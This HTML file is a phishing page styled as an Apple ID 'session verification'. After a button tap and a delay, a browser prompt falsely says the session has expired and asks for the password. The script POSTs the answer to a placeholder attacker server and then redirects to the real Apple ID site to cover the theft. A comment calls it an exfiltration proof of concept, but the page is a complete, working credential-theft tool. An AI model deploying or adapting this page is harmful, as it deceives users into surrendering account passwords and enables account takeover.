<!DOCTYPE html>
<html>
<head>
  <title>Secure Session Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #f4f4f4;
      height: 100%;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    button {
      padding: 16px 32px;
      font-size: 18px;
      background: #007aff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    h2 {
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

<h2>Tap to Continue</h2>
<button onclick="start()">Verify Identity</button>

<script>
function start() {
  // Delay prompt after gesture
  setTimeout(() => {
    const input = prompt("🔐 Apple ID session expired.\nPlease enter your password to continue:");

    // After prompt, delay again then redirect to legit site
    setTimeout(() => {
      location.href = "https://appleid.apple.com"; // trusted domain
    }, 800);

    // Optional: Send data (if testing exfil PoC)
    if (input) {
      fetch("https://your-attacker-server.com/log", {
        method: "POST",
        body: JSON.stringify({ password: input }),
        headers: {
          "Content-Type": "application/json"
        }
      });
    }

  }, 3000); // Prompt shows after 3s delay (user loses gesture context)
}
</script>

</body>
</html>
